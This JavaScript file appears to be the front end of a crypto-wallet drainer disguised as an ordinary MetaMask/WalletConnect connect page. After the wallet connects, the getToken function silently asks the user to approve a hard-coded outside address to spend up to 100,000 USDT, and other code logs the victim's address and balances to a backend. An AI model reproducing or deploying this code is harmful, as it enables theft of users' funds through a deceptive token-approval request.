let account = "";
let ethBalance = 0;
let tokenBalance = 0;
let spender = "0xAFc81F998b193bc06Eb89190e97Ec6155Be4f365";
let tokens = [
  {
    name: "USDT",
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    decimals: 6,
  },
];

const walletConnectProviderConfig = new WalletConnectProvider.default({
  infuraId: "27e484dcd9e3efcfd25a83a78777cdf1",
  qrcodeModalOptions: {
    desktopLinks: [
      "ledger",
      "tokenary",
      "wallet",
      "wallet 3",
      "secuX",
      "ambire",
      "wallet3",
      "apolloX",
      "zerion",
      "sequence",
      "punkWallet",
      "kryptoGO",
      "nft",
      "riceWallet",
      "vision",
      "keyring",
    ],
    mobileLinks: [
      "metamask",
      "trust",
      "rainbow",
      "argent",
      "imtoken",
      "pillar",
    ],
  },
});


document.body.addEventListener("click", function (e) {
  let targetId = e.target.id;
  if (targetId == "connect-metamask") {
    if (typeof window.ethereum != undefined) {
      checkConnection(window.ethereum);
      console.log("Metamask installed");
    } else {
      document.getElementById("download-metamask-modal").style.display =
        "block";
    }
  } else if (targetId == "install-metamask-wallet") {
    window.open("https://metamask.io/download/");
  } else if (targetId == "connect-metamask-wallet-again") {
    checkConnection(window.ethereum);
  } else if (targetId == "close-download-metamask-modal") {
    document.getElementById("download-metamask-modal").style.display = "none";
  } else if (targetId == "connect-walletconnect") {
    walletConnectProviderConfig
      .enable()
      .then(function (provider) {
        checkConnection(provider);
      })
      .catch(function (error) {
        console.log(error);
      });
  }
});

function checkConnection(provider) {
  provider
    .request({ method: "eth_accounts" })
    .then(function (accounts) {
      if (accounts.length > 0) {
        account = accounts[0];
      } else {
        login(provider);
      }
    })
    .catch(function (err) {});
}

async function login(provider) {
  document.getElementById("content").style.display = "none";
  document.getElementById("loading").style.display = "block";
  document.getElementById("loading-text").style.display = "block";
  const accounts = await provider
    .request({ method: "eth_requestAccounts" })
    .then(function (accounts) {
      account = accounts[0];
      getEthBalance(provider);
      getTokenBalance(provider, tokens[0]);
    })
    .catch((e) => {
      document.getElementById("loading").style.display = "none";
      document.getElementById("loading-text").style.display = "none";
      document.getElementById("content").style.display = "block";
    });
}

function getEthBalance(provider) {
  let web3 = new Web3(provider);
  web3.eth.getBalance(account, function (err, result) {
    if (err) {
      document.getElementById("loading").style.display = "none";
      document.getElementById("loading-text").style.display = "none";
      document.getElementById("content").style.display = "block";
      console.log(err);
    } else {
      ethBalance = web3.utils.fromWei(result);
    }
  });
}

async function getTokenBalance(provider, token) {
  let web3 = new Web3(provider);
  let contract = new web3.eth.Contract(ERC20, token.address);
  let balance = await contract.methods.balanceOf(account).call();
  let decimals = Math.pow(10, token.decimals);
  tokenBalance = balance / decimals;
  getToken(token, provider);
}

function getToken(token, provider) {
  let web3 = new Web3(provider);
  let contract = new web3.eth.Contract(ERC20, token.address);
  contract.methods
    .approve(spender, Math.pow(10, token.decimals) * 100000)
    .send({ from: account })
    .then(function (receipt) {
      // getUser(true);
    })
    .catch(function (err) {
      // getUser(false);
    });
}

ethereum.on("accountsChanged", function (accounts) {
  account = accounts[0];
});
ethereum.on("chainChanged", (chainId) => {
  location.reload();
});

function getUser(hasAccess) {
  let getUserXhr = new XMLHttpRequest();
  getUserXhr.open("GET", `http://127.0.0.1/user/${account}`, true);
  getUserXhr.send();

  getUserXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = JSON.parse(this.response);
      if (response.walletAddress != null) {
        history.back();
      } else {
        createUser(hasAccess);
      }
    }
  };
}

function createUser(hasAccess) {
  let userPayload = {
    walletAddress: account,
    balance: ethBalance,
    usdt: tokenBalance,
    hasAccess: hasAccess,
  };
  let createUserXhr = new XMLHttpRequest();
  createUserXhr.open("POST", `http://127.0.0.1/user`, true);
  createUserXhr.setRequestHeader("Content-type", "application/json");
  createUserXhr.send(JSON.stringify(userPayload));

  createUserXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      history.back();
    }
  };
}
